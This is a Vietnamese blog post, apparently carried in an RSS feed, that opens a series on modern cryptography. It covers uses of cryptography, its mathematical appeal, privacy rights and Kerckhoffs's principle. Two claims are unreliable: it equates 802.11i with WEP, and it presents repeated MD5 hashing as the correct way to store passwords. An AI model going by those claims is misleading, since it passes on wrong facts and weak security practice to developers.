  <author>R.J. Lorimer</author>
  <pubDate>2011-01-14T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/research/2011/01/14/crypto-1.html</guid>
  <description><![CDATA[
     <p>Tôi dự tính viết về đề tài này từ cả năm nay, mà mãi tới bây giờ mới có đủ động lực để viết. Có hai lý do khiến tôi bắt đầu.</p>

<p>Thứ nhất, số là tôi đang theo học một cách chính quy về mật mã, mà kinh nghiệm cho thấy cách học (và đọc sách) tốt nhất là viết, tóm tắt lại và giải thích rành mạch rõ ràng những gì vừa học được cho người khác. Chừng nào làm được như thế thì mới có thể xem là đã hiểu được vấn đề đang muốn học.</p>

<p>Thứ hai, hôm rồi tôi đọc một mẩu chuyện về Richard Feynman, trong đó có đoạn kể về lúc Feynman bị bệnh, gần đất xa trời, ông tâm sự rằng, “[I’m going to die but I’m not as sad as you think because] when you get as old as I am, you start to realize that <a href="http://www.longnow.org/essays/richard-feynman-connection-machine/">you’ve told most of the good stuff you know to other people anyway</a>“. Đương nhiên những gì tôi biết làm sao mà “good” bằng những gì Feynman biết, nhưng dẫu sao thì tôi cũng sẽ học theo Feynman, có biết cái gì hay ho thì giải thích cho nhiều người khác cùng biết.</p>

<h2 id="i-m-u">I. Mở đầu</h2>

<h3 id="gii-thiu">1. Giới thiệu</h3>

<p>Loạt bài này tôi sẽ giới thiệu về mật mã học hiện đại, tập trung vào giải thích cách thức hoạt động của các thành phần mật mã cơ sở (cryptographic primitive) và làm sao sử dụng chúng cho đúng cách.</p>

<p>Mật mã là công cụ rất mạnh mẽ làm nhiều người lầm tưởng rằng cứ sử dụng mật mã là an toàn, mà không biết rằng mật mã là con dao hai lưỡi. Bạn có thể xây dựng một hệ thống với đầy đủ các ý tưởng hay ho nhất của mật mã, nhưng nếu bạn không dùng mật mã đúng cách, hệ thống của bạn sẽ hoàn toàn thiếu an toàn.</p>

<p>Đã có rất nhiều ví dụ, mà tiêu biểu là các kết quả làm việc gần đây của tôi và đồng nghiệp (xem <a href="http://vnhacker.blogspot.com/2009/09/flickrs-api-signature-forgery.html">đây</a>, <a href="http://vnhacker.blogspot.com/2010/06/practical-padding-oracle-attacks.html">đây</a> và <a href="http://vnhacker.blogspot.com/2010/10/first-time-on-screen.html">đây</a>). Hoặc như gần đây, hệ thống bảo vệ máy PS3 của Sony bị phá vỡ hoàn toàn chỉ vì sử dụng sai mật mã. Không riêng gì Sony, mà rất nhiều hãng lớn trên thế giới, từ Oracle, Yahoo!, đến Microsoft, đã sử dụng sai mật mã và làm cho sản phẩm của họ thiếu an toàn.</p>

<p>Điều này cho thấy, chỉ biết mật mã giúp gì cho bạn là chưa đủ, mà bạn cần phải biết làm thế nào để sử dụng chúng đúng cách. Khi biết cách sử dụng đúng mật mã rồi, bạn sẽ có thể dùng mật mã để xây dựng các hệ thống an toàn hơn, và đồng thời có thể đánh giá được sản phẩm sử dụng mật mã của bên thứ ba.</p>

<p>Giáo trình mà tôi sử dụng là cuốn sách “<a href="http://www.amazon.com/Introduction-Modern-Cryptography-Principles-Protocols/dp/1584885513">Introduction To Modern Cryptography</a>” của Jonathan Katz và Yehuda Lindell (từ đây về sau gọi là KL). Trong quá trình học mật mã, tôi cũng đã đọc thử nhiều sách khác nhau, nhưng cuốn KL này là thích hợp hơn nhất cho việc tìm hiểu mật mã học hiện đại. KL cũng được sử dụng làm giáo trình để dạy mật mã cho cấp đại học và cao học ở nhiều trường đại học trên thế giới. Bạn nào có điều kiện thì nên mua sách. Nếu là sinh viên thì có thể liên hệ với tôi (ở TP.HCM) để mượn sách mà đọc.</p>

<p>Một cuốn sách miễn phí khác có thể dùng để thay thế KL là cuốn Handbook of Applied Cryptography. Kết thúc mỗi bài viết, tôi sẽ liệt kê trang nào trong KL hoặc HAC cần phải đọc.</p>

<p>Loạt bài được chia làm ba phần lớn. Phần đầu tiên nói về mã đối xứng, phần thứ hai nói về mã bất đối xứng, và phần thứ ba sẽ bàn về các đề tài nâng cao. Trong phần thứ nhất tôi sẽ giải quyết vấn đề: làm thế nào để chị A và anh B liên lạc với nhau an toàn, khi hai người đã có một khóa bí mật chung? Vấn đề của phần thứ hai sẽ là làm thế nào để chị A và anh B chưa quen biết nhau có thể tạo ra một khóa bí mật chung chỉ có hai anh chị biết mà thôi? Trong phần thứ ba, tùy vào tình hình mà tôi sẽ viết về các đề tài như tiền điện tử, bầu cử điện tử hay đấu giá điện tử.</p>

<p>Tôi cũng muốn lưu ý là nội dung loạt bài sẽ có những phần không nằm trong cuốn KL, và tôi sẽ cố gắng để người đọc hiểu được loạt bài này mà không cần phải tham khảo thêm tài liệu khác. Nghĩa là khi nào cần thì tôi sẽ cung cấp các kiến thức hỗ trợ, ví dụ như các kiến thức toán (bao gồm lý thuyết xác suất, lý thuyết số, đại số trừu tượng và một ít lý thuyết độ phức tạp tính toán). Tôi cũng không chắc là tôi làm được (tự vì tôi cũng đang học như bạn mà thôi!), nhưng mà tôi sẽ cố gắng. Mục tiêu của tôi là nếu bạn theo sát loạt bài viết này từ đầu, thì khi kết thúc, bạn sẽ hiểu mật mã học hiện đại hoạt động ra sao, và cách sử dụng chúng như thế nào cho đúng và an toàn.</p>

<h3 id="ti-sao-mt-m">2. Tại sao mật mã?</h3>

<p>Trước khi đi vào nội dung chính của bài viết đầu tiên, tôi muốn dành ra ít phút để thuyết phục bạn là tại sao chúng ta cần phải học mật mã. Cá nhân tôi thấy có ba lý do chính.</p>

<p>Thứ nhất, mật mã là công cụ rất quan trọng, được sử dụng ở mọi nơi. Tôi đồ rằng nhiều bạn dùng mật mã hàng ngày mà lại không biết. Bạn có dùng GMail hoặc có bao giờ mua hàng trên Amazon không? Nếu có thì bạn đã dùng mật mã rồi đó.</p>

<p>Bạn có chú ý là khi bạn vào GMail hoặc Amazon, địa chỉ mà bạn sử dụng bắt đầu bằng HTTPS thay vì HTTP không? Chữ S trong HTTPS là viết tắt của Secure, hiểu nôm na rằng HTTPS là phiên bản an toàn hơn so với HTTP, và sự an toàn này là nhờ vào bộ giao thức mật mã mang tên Secure Socket Layer, phiên bản mới hơn gọi là Transport Layer Security. Nhờ có SSL/TLS mà bạn có thể an tâm giao dịch với Amazon mà không sợ thông tin giao dịch của bạn bị đánh cắp hoặc chỉnh sửa trong quá trình truyền từ máy tính của bạn lên đến máy chủ của Amazon. Nói cách khác, không có mật mã thì đã không có thương mại điện tử rồi!</p>

<p>SSL/TLS được dùng chủ yếu để bảo vệ thế giới web, mà Internet thì đâu chỉ có web. Mật mã còn có thể được sử dụng để đảm bảo an toàn cho email. Email có hai vấn đề cần phải giải quyết. Thứ nhất, làm thế nào để đảm bảo tính riêng tư, tỉ như chị A viết thư cho anh B, thì chỉ có anh B đọc được thư đó thôi, không ai khác đọc được cả. Thứ hai, làm thế nào để hiện thực hóa vấn đề chữ ký trong thư từ thông thường, nói cách khác làm sao để anh B biết chắc là thư đang đọc đến từ chị A, không bị ai sửa chữa giả mạo gì cả, và sau này chị A cũng không thể chối là chị không phải là tác giả của lá thư đó? Đây chính là yêu cầu bắt buộc của khái niệm chữ ký điện tử mà chúng ta thường nghe. Tương tự như SSL/TLS, PGP/OpenPGP là tiêu chuẩn phổ biến nhất để bảo vệ email thông qua các thành tựu của mật mã học.</p>

<p>Nếu bạn là lập trình viên, thì chắc chắn sẽ có lúc nào đó bạn gặp phải vấn đề xác thực người dùng, và lúc đó bạn sẽ cần phải sử dụng mật mã để xây dựng nên một cơ chế quản lý mật khẩu và xác thực người dùng một cách an toàn. Thay vì lưu mật mã trực tiếp xuống cơ sở dữ liệu, nhiều lập trình viên đã biết sử dụng các thuật toán băm một chiều để bảo vệ mật khẩu. Tuy vậy phần lớn trong số đó vẫn sử dụng sai mật mã, khiến cho mặc dù có dùng mật mã, nhưng hệ thống của họ vẫn không an toàn hơn là mấy. Thí dụ như nếu bạn chỉ băm mật khẩu xuyên qua MD5 một lần, thì bạn đã làm sai! Cách làm đúng là phải băm ít nhất 1000 lần, và còn nhiều tiểu tiết khác nữa!</p>

<p>Người ta còn dùng mật mã để bảo vệ các giao thức mạng không dây. Thầy tôi thường nói ông phải cảm ơn những người đã thiết kế ra tiêu chuẩn 802.11i, còn được biết đến là WEP, bởi WEP đã phạm phải mọi sai lầm từng được biết đến trong các sách giáo khoa về mật mã, nên mỗi lần cần đưa ra ví dụ về cách sử dụng sai mật mã, thầy tôi chỉ việc lấy một ví dụ từ WEP! Ông gọi WEP là một giao thức được “thiết kế sau những cánh cửa đóng”, đi ngược lại hoàn toàn với tiêu chí mở trong mã hóa (tôi sẽ nói thêm về tiêu chí mở này ở bên dưới). Trong loạt bài này, bạn sẽ thấy ngoài WEP ra còn có rất nhiều giao thức, thuật toán mã hóa được “thiết kế sau những cánh cửa đóng”, và tất cả đều không an toàn.</p>

<p>Ngoài những ứng dụng trực tiếp kể trên ra, mật mã còn được sử dụng trong nhiều lĩnh vực có vẻ không liên quan mấy, ví dụ như bầu cử, đấu giá, tiền điện tử hay bảo vệ bản quyền điện tử. Đây là những chủ đề mà bản thân tôi chưa có cơ hội tìm hiểu; dẫu vậy tôi có kế hoạch sẽ tìm hiểu chúng trong tương lai gần. Tóm lại, lý do thứ nhất cần phải học mật mã là vì mật mã rất mạnh mẽ và có thể giúp chúng ta giải quyết nhiều vấn đề tự nhiên đến từ cuộc sống.</p>

<p>Thứ hai, mật mã rất đẹp, đơn giản vì nó là sự giao thoa và ứng dụng của rất nhiều nhánh trong toán học, mà toán đẹp cỡ nào thì khỏi phải bàn rồi phải không? ;-).</p>

<p><a href="http://tuanvanle.wordpress.com/2010/12/16/%E1%BB%A9ng-d%E1%BB%A5ng-toan-h%E1%BB%8Dc-%E2%80%93-%E2%80%9Cm%E1%BA%A3nh-d%E1%BA%A5t-h%E1%BB%A9a%E2%80%9D-d%E1%BA%A7y-chong-gai/">Giáo sư Phạm Huy Điển từng viết rất hay như thế này</a>:</p>

<blockquote>
  <p>Lâu nay không ít người cảm thấy thất vọng vì đã “uổng công” học Toán. Nghe người ta nói thì Toán học là “chìa khóa” cho mọi vấn đề, nhưng trên thực tế thì học sinh sau khi tốt nghiệp lại chẳng biết dùng kiến thức Toán đã học được trong nhà trường vào việc gì trong cuộc sống, nhất là những bài toán khó mà họ đã tốn bao công sức nhồi nhét trong các “lò luyện” đủ loại. Đây là một thực tế, xuất phát từ việc xác định nội dung và phương pháp dạy Toán không hợp lý trong các nhà trường hiện nay. Toán học đã bị biến thành một môn “đánh đố thuần túy”, thay vì một bộ môn khoa học mang đầy chất thực tiễn. Tuy nhiên, còn một lý do khác khiến chúng ta không nhìn thấy được bóng dáng của Toán học trong thực tiễn thường ngày, đó là Toán học ngày nay không mấy khi trực tiếp đi được vào các ứng dụng trong thực tiễn mà thường phải “ẩn” sau các ngành khoa học khác: Sinh học, Môi trường, Tài chính, Kinh tế… và thậm chí ngay cả Công nghệ thông tin, một lĩnh vực có thể xem như là được sinh ra từ Toán học. Đã có những ý kiến nói về sự lãng phí của nguồn nhân lực đang làm Toán hiện nay và không ít người cũng đã tưởng là thật…</p>

  <p>May mắn thay, khoa học Mật mã đã góp một phần quan trọng trong việc làm sáng tỏ cái “sự thật oan trái” này. Có thể nói rằng hiếm có lĩnh vực nào mà vai trò của các công cụ Toán học lại được thể hiện rõ ràng đến như vậy. Chính Toán học đã làm nên cuộc cách mạng trong công nghệ mật mã, trước hết là bằng sự hiện thực hóa các ý tưởng về mật mã khóa công khai mà các nhà mật mã chuyên nghiệp đã ấp ủ từ lâu, và sau đó là đưa một số kết quả của Toán học (thuộc loại trừu tượng vào bậc nhất) tiếp cận với các ứng dụng trong thực tiễn.</p>
</blockquote>

<p>Bạn nào hồi phổ thông có học chuyên toán chắc hẳn sẽ nhớ đến định lý nhỏ (rất đẹp!) của Fermat phát biểu rằng: nếu $latex {p}$ là số nguyên tố, thì ta có: $latex forall a in mathbb{Z}, a^p equiv a , (mod , p)$. Khi học mật mã, bạn sẽ thấy lại định lý này và nhiều ứng dụng tuyệt vời của nó! Tôi có thể bật mí sơ là hệ mã nổi tiếng RSA được xây dựng dựa trên kết quả của định lý đơn giản này!&lt;/span&gt;&lt;/span&gt;</p>

<p>Ngoài toán ra, mật mã học hiện đại còn được xây dựng dựa trên lý thuyết trung tâm của khoa học máy tính: lý thuyết độ phức tạp tính toán (mà thiệt ra cũng là toán thôi). Thành ra đối với những người học khoa học máy tính hoặc nói đơn giản là làm IT như chúng ta, tìm hiểu về mật mã là một cách để thưởng thức cái đẹp của khoa học máy tính.</p>

<p>Bạn nào học lý thuyết độ phức tạp tính toán rồi thì đều biết là có những bài toán mà chúng ta chưa biết khó cỡ nào, chỉ biết là sao bao nhiêu năm nghiên cứu, thế giới vẫn chưa tìm ra thuật toán “hiệu quả” để giải. Câu hỏi là có cách nào lợi dụng những bài toán khó đó để phục vụ cho lợi ích của con người? Nghe có vẻ hơi ngược đời đúng không, chưa tìm ra lời giải thì làm sao mà lợi với chả dụng? Thế mà những người tiên phong của mật mã hiện đại đã nghĩ ra cách sử dụng các bài toán khó như thế và chính những ứng dụng độc đáo sáng tạo như thế này làm nên vẻ đẹp của mật mã!</p>

<p>Lý do thứ ba? Tự bảo vệ những quyền con người cơ bản của chính chúng ta!</p>

<p>Ai cũng có quyền có bí mật, và ai cũng có quyền quyết định khi nào và như thế nào họ sẽ tiết lộ bí mật đó cho người khác. Chúng ta kết nối vào Internet để gửi email, đọc blog, mua một món hàng hay công bố một bài viết mới; mỗi một hành động như thế đều có thể được diễn dịch theo nhiều ngữ nghĩa khác nhau, mà mỗi cách diễn dịch đôi khi lại đem đến những thiệt hại không mong muốn cho chính chúng ta. Thành ra cách tốt nhất là hạn chế tiết lộ danh tính, và nếu ẩn danh được thì càng tốt (cá nhân tôi cho rằng, sở dĩ Internet phát triển như ngày nay một phần là vì bản chất ẩn danh của nó, dẫu đây chỉ là một sự ngộ nhận). Hơn nữa, không phải cái gì chúng ta nói, chúng ta viết đều là dành cho tất cả mọi người; đôi khi chúng ta muốn chỉ duy nhất một nhóm vài người có thể đọc và nghe được những ý kiến của chúng ta. Đây là quyền riêng tư. Mời bạn đọc thêm <a href="http://www.activism.net/cypherpunk/manifesto.html">A Cypherpunk’s Manifesto</a>.</p>

<p>Ai cũng có quyền tự do ngôn luận, tự do thể hiện, tự do tí toáy, ở ngoài đời thật hoặc ở trên Internet. Chắc hắn không cần phải giải thích, tất cả chúng ta đều biết những quyền này quan trọng như thế nào đối với sự tự do của mỗi cá nhân. Vậy ai muốn xâm hại những quyền con người cơ bản của chúng ta? Tôi nghĩ câu hỏi này là thừa, bởi vì rõ ràng sự tự do của tất cả chúng ta đã, đang và bị xâm hại. Khi bạn không kết nối vào được Facebook, nghĩa là bạn đã không còn được tự do.</p>

<p>May mắn thay, những thành tựu trong vài chục năm vừa qua của mật mã có thể phần nào giúp tất cả chúng ta đảm bảo được tính riêng tư và sự tự do trong cuộc sống hàng ngày. Tôi hi vọng là qua loạt bài viết này, tất cả các bạn sẽ hiểu được sức mạnh của mật mã, rồi từ đó sử dụng chúng đúng cách để bảo vệ những quyền và lợi ích chính đáng của bản thân.</p>

<h3 id="nguyn-l-kerckhoff">3. Nguyên lý Kerckhoff</h3>

<p>Nguyên lý do ông Kerckhoff phát biểu vào thế kỷ 19 với nội dung như sau:</p>

<blockquote>
  <p>Một hệ thống mã hóa phải an toàn ngay cả khi tất cả thông tin về hệ thống đó đều đã được công bố ra ngoài. Bí mật duy nhất của hệ thống là một khóa ngắn.</p>
</blockquote>

<p>Thực tế cho thấy tất cả các công nghệ mã hóa “thiết kế sau những cánh cửa đóng” đều bị phá vỡ nhanh chóng ngay khi một ai đó “reverse engineer” và công bố thiết kế của chúng. RC4 (dùng để mã hóa mạng không dây), A5/1 (dùng để mã hóa mạng điện thoại GSM), CSS (dùng để mã hóa đĩa DVD), Crypto-1 (dùng để mã hóa các thẻ thanh toán điện tử)… tất cả đều bị phá vỡ trong một thời gian ngắn, kể từ lúc thuật toán bị “reverse engineer”.</p>

<p>Thành ra khi sử dụng mật mã, chúng ta sẽ tuyệt đối tuân thủ nguyên lý Kerckhoff này. Nói cách khác, chúng ta chỉ sử dụng những thuật toán, tiêu chuẩn, hệ thống mã hóa mở. May mắn là đã có sẵn rất nhiều thuật toán, tiêu chuẩn và hệ thống mã hóa mở, chúng ta chỉ việc chọn cái thích hợp mà dùng, không cần phải xây dựng lại từ đầu. Tuyệt đối không sử dụng những tiểu chuẩn, thuật toán, hệ thống đóng! Nói cách khác, avoid security through obscurity.</p>

<p>Mật mã là sân chơi của những ông già bảo thủ ;-), những người luôn đặt ra những điều kiện khó nhất, và rồi cố gắng xây dựng một hệ thống an toàn trong những điều kiện đó. Điều thú vị là họ thành công!</p>


  ]]></description>
</item>

</channel>
</rss>